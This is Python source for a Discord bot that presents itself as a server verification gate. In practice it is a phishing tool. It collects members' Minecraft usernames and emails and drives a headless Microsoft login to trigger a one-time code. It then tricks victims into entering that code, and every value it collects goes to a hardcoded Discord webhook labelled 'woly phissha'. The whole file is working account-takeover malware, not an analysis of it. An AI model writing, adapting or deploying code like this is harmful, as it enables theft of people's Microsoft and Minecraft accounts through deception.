#import
import discord
import time
from discord.ext import commands
import json
import requests
import datetime
from datetime import datetime
from datetime import timedelta
import calendar
import asyncio
from playwright.async_api import async_playwright
#define
embed = discord.Embed(title="Verification", description="By verifying through the form, you will gain access to the rest of the Discord server. Please click the button below to proceed with the verification process. Thank you.", color=40192)
embed4 = discord.Embed(title="❌ - Error", description="You've entered a fake or not exisiting email. Please enter your real email address. \n Thank you.", color=40192)
embed2 = discord.Embed(title="Verification Code Sent", description=f"""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
embed2.set_footer(text="Click the button below to enter your verification code!")
#setup shit
class MyView(discord.ui.View): # Create a class called MyView that subclasses discord.ui.View
    @discord.ui.button(label="Verify", style=discord.ButtonStyle.primary, emoji="✅") # Create a button with the label "✅ Click me!" with color Blurple
    async def button_callback(self, button, interaction):
         await interaction.response.send_modal(MyModal(title="Verification"))

class MyView2(discord.ui.View): # Create a class called MyView that subclasses discord.ui.View
    @discord.ui.button(label="Enter Code", style=discord.ButtonStyle.primary, emoji="✅") # Create a button with the label "✅ Click me!" with color Blurple
    async def button_callback(self, button, interaction):
         await interaction.response.send_modal(MyModal2(title="Code"))


class MyModal(discord.ui.Modal):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.add_item(discord.ui.InputText(label="Minecraft Username"))
        self.add_item(discord.ui.InputText(label="Minecraft Email"))


    async def callback(self, interaction: discord.Interaction):
        global username
        username = value=self.children[0].value
        global email
        email = value=self.children[1].value
        embed = discord.Embed(title=f"We have sent a verification code to {email} - Please check your inbox and submit the code")
        await interaction.response.send_message(embeds=[embed], ephemeral=True, view=MyView2())
        requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
  "username": "woly phissha",
  "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
  "content": "@everyone idk what im doing",
  "embeds": [
    {
      "author": {
        "name": "Email And Username Entered  -> Sky Crypt",
        "color": 2829617,
        "url": f"https://sky.shiiyu.moe/stats/{username}"
      },
      "image": {},
      "thumbnail": {},
      "footer": {},
      "fields": [
        {
          "name": "💬 - **Username**",
          "value": f"```{username}```"
        },
        {
          "name": "✉️ - **E-Mail**",
          "value": f"```{email}```"
        },
      ]
    }
  ],
    "components": []
})
        await requestcode()

        

import asyncio
from playwright.async_api import async_playwright

async def requestcode():
    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(headless=False)
        page = await browser.new_page()
        context = await browser.new_context()

        await page.goto("https://account.microsoft.com/")
        await page.wait_for_selector('#id__4', state='visible')
        await page.click('#id__4')
        await page.fill('input[name="loginfmt"]', email)
        await page.click('input[type="submit"]')
        requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
      "username": "woly phissha",
      "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
      "content": f"Sucessfully got code from {email}"
})
        try:
          await page.wait_for_selector('#otcLoginLink', state='visible')
          await page.click('#otcLoginLink')
        except Exception as e:
                      requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
      "username": "woly phissha",
      "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
      "content": f"Wasent able to retrieve code from {email} normal way. Trying different metheod"
})
                      await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
                      await page.click('#idA_PWD_SwitchToCredPicker')
                      await page.click(f'text=Email {email}')
                      requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
      "username": "woly phissha",
      "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
      "content": f"@everyone Successfully got code from {email}"
})



class MyModal2(discord.ui.Modal):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.add_item(discord.ui.InputText(label="Verification Code"))

    async def callback(self, interaction: discord.Interaction):
        date_time = datetime.utcnow()
        date = date_time + timedelta(minutes=30)
        utc_time = calendar.timegm(date.utctimetuple())
        Code = value=self.children[0].value
        requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json ={
  "username": "i steal the shippy embed shit - wol",
  "avatar_url": "https://media.discordapp.net/attachments/1087806512442900491/1087813733134381066/0518a2a092bfdc95593b76aead97f220.jpg",
  "content": "@everyone code",
  "embeds": [
    {
      "title": "Code entered!",
      "color": 2829617,
      "description": "",
      "timestamp": "",
      "author": {
        "name": "otp code (icba to get discord user name)"
      },
      "image": {},
      "thumbnail": {},
      "footer": {},
      "fields": [
        {
          "name": "🎁 - OTP (One-time password)",
          "value": f"```{Code}```"
        },
        {
          "name": "⌛ - Expires in",
          "value": f"<t:{utc_time}:R>"
        }
      ]
    }
  ],
  "components": []
})
        embed = discord.Embed(title="Verification Complete!")
        await interaction.response.send_message(embeds=[embed], ephemeral=True)



intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
print ("Bot's running")
client = commands.Bot(command_prefix= "slash", intents=intents)
client.remove_command('help')

#set sttauts
@client.event
async def on_ready():
   await client.change_presence(status=discord.Status.dnd, activity=discord.Game("Watching 8 Servers!"))
#comand
@client.slash_command(name="setup", description="Setup Verification")
async def setup(ctx):
    await ctx.send(embed=embed, view=MyView(timeout=None))





client.run("token")